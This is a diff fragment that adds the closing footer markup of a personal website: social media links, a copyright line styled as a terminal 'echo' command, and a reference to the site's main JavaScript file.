+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
